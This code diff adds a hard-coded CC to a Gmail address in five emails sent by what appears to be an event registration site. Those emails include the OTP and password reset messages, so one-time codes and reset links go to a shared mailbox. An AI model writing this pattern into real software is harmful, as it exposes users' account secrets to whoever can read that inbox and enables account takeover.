@@ -20,6 +20,7 @@ export async function sendOtpEmail(
   await transporter.sendMail({
     from: `"INTERACT 2K26" <${process.env.SMTP_EMAIL}>`,
     to: email,
+    cc: ["interact2k26@gmail.com"],
     subject: "Your OTP for INTERACT 2K26 Registration",
     html: `
       <div style="font-family:Arial,sans-serif;max-width:480px;margin:0 auto;padding:32px;border:1px solid #e5e7eb;border-radius:8px;">
@@ -43,6 +44,7 @@ export async function sendPasswordResetEmail(
   await transporter.sendMail({
     from: `"INTERACT 2K26" <${process.env.SMTP_EMAIL}>`,
     to: email,
+    cc: ["interact2k26@gmail.com"],
     subject: "Reset your INTERACT 2K26 password",
     html: `
       <div style="font-family:Arial,sans-serif;max-width:480px;margin:0 auto;padding:32px;border:1px solid #e5e7eb;border-radius:8px;">
@@ -63,6 +65,7 @@ export async function sendPaymentUploadReceivedEmail(
   await transporter.sendMail({
     from: `"INTERACT 2K26" <${process.env.SMTP_EMAIL}>`,
     to: email,
+    cc: ["interact2k26@gmail.com"],
     subject: "Payment proof received",
     html: `
       <div style="font-family:Arial,sans-serif;max-width:520px;margin:0 auto;padding:32px;border:1px solid #e5e7eb;border-radius:8px;">
@@ -83,6 +86,7 @@ export async function sendPaymentVerifiedEmail(
   await transporter.sendMail({
     from: `"INTERACT 2K26" <${process.env.SMTP_EMAIL}>`,
     to: email,
+    cc: ["interact2k26@gmail.com"],
     subject: "Payment verified",
     html: `
       <div style="font-family:Arial,sans-serif;max-width:520px;margin:0 auto;padding:32px;border:1px solid #e5e7eb;border-radius:8px;">
@@ -104,6 +108,7 @@ export async function sendPaymentRejectedEmail(
   await transporter.sendMail({
     from: `"INTERACT 2K26" <${process.env.SMTP_EMAIL}>`,
     to: email,
+    cc: ["interact2k26@gmail.com"],
     subject: "Payment rejected",
     html: `
       <div style="font-family:Arial,sans-serif;max-width:520px;margin:0 auto;padding:32px;border:1px solid #e5e7eb;border-radius:8px;">
